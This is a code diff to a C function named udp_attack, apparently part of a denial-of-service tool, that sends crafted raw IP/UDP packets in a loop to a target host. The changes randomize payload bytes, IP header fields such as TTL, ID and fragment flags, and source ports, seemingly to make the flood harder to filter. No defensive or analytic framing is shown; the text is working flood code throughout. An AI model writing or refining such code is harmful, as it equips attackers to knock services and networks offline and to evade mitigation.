@@ -36,7 +36,12 @@ void* udp_attack(void* arg) {
         close(udp_sock);
         return NULL;
     }
-    memset(packet, 0, packet_size);
+
+    unsigned char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
+    size_t data_len = packet_size - sizeof(struct iphdr) - sizeof(struct udphdr);
+    for (size_t i = 0; i < data_len; i++) {
+        data[i] = rand() & 0xFF;
+    }
 
     struct iphdr* iph = (struct iphdr*)packet;
     struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
@@ -49,16 +54,16 @@ void* udp_attack(void* arg) {
 
     iph->ihl = 5;
     iph->version = 4;
-    iph->tos = 0;
+    iph->tos = (rand() % 2) ? 0x08 : 0;
     iph->tot_len = htons(packet_size);
-    iph->id = htons(rand() % 65535);
-    iph->frag_off = 0;
-    iph->ttl = 255;
+    iph->id = htons(45876 + (rand() % 2048));
+    iph->frag_off = rand() % 2 ? 0 : htons(0x4000);
+    iph->ttl = (rand() % 2) ? (64 + (rand() % 64)) : (128 + (rand() % 64));
     iph->protocol = IPPROTO_UDP;
     iph->saddr = INADDR_ANY;
     iph->daddr = params->target_addr.sin_addr.s_addr;
 
-    udph->source = htons(params->srcport > 0 ? params->srcport : (rand() % 65535));
+    udph->source = htons(params->srcport > 0 ? params->srcport : ((rand() % 2) ? (1024 + (rand() % 1024)) : (10000 + (rand() % 55534))));
     udph->dest = params->target_addr.sin_port;
     udph->len = htons(packet_size - sizeof(struct iphdr));
     udph->check = 0;
@@ -68,7 +73,7 @@ void* udp_attack(void* arg) {
         iph->id = htons(rand() % 65535);
         iph->check = generic_checksum((unsigned short*)iph, sizeof(struct iphdr));
         udph->check = tcp_udp_checksum(udph, packet_size - sizeof(struct iphdr), iph->saddr, iph->daddr, IPPROTO_UDP);
-        ssize_t sent = sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
+        ssize_t sent = sendto(udp_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
         if (sent < 0) break;
     }
     free(packet);
